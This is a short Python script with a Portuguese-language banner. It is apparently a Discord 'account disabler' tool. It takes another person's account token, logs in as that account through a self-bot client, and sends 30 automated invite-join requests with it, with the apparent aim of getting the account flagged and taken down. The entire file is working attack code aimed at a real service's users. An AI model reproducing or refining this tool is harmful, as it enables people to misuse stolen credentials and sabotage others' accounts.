import discord
import asyncio
import os
import requests
import time
import sys
from colorama import Fore
os.system("title [Criado por JapaInCode]")

y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX

print(""" 

     
     ▓█████▄ ▓█████   ██████  ▄▄▄     ▄▄▄█████▓ ██▓ ██▒   █▓ ▄▄▄      ▓█████▄  ▒█████  
     ▒██▀ ██▌▓█   ▀ ▒██    ▒ ▒████▄   ▓  ██▒ ▓▒▓██▒▓██░   █▒▒████▄    ▒██▀ ██▌▒██▒  ██▒
     ░██   █▌▒███   ░ ▓██▄   ▒██  ▀█▄ ▒ ▓██░ ▒░▒██▒ ▓██  █▒░▒██  ▀█▄  ░██   █▌▒██░  ██▒
     ░▓█▄   ▌▒▓█  ▄   ▒   ██▒░██▄▄▄▄██░ ▓██▓ ░ ░██░  ▒██ █░░░██▄▄▄▄██ ░▓█▄   ▌▒██   ██░
     ░▒████▓ ░▒████▒▒██████▒▒ ▓█   ▓██▒ ▒██▒ ░ ░██░   ▒▀█░   ▓█   ▓██▒░▒████▓ ░ ████▓▒░
      ▒▒▓  ▒ ░░ ▒░ ░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░ ▒ ░░   ░▓     ░ ▐░   ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▒░▒░ 
      ░ ▒  ▒  ░ ░  ░░ ░▒  ░ ░  ▒   ▒▒ ░   ░     ▒ ░   ░ ░░    ▒   ▒▒ ░ ░ ▒  ▒   ░ ▒ ▒░ 
      ░ ░  ░    ░   ░  ░  ░    ░   ▒    ░       ▒ ░     ░░    ░   ▒    ░ ░  ░ ░ ░ ░ ▒  
        ░       ░  ░      ░        ░  ░         ░        ░        ░  ░   ░        ░ ░  
      ░                                                 ░              ░               

    {/Derrubar uma conta
                                                     
                                                     """)
time.sleep(0.5)

token = input ("     [-] Token da conta que você irá derrubar : ")

client = discord.Client()
print ("     [-] Aguardando o sinal para derrubar a conta!")

@client.event
async def on_ready():
    print ("     [-] Derrubando...")
    for x in range(30):
        apilink = "https://discordapp.com/api/v6/invite/b42e7r3Gmb"
        headers={
        'Authorization': token
        }
        requests.post(apilink, headers=headers)
    print ("     [-] Conta derrubada com sucesso!")
    input()
    sys.exit()
try:
    client.run(token,bot=False)
except Exception:
    print ("     [-] Token inválida :(")
    
    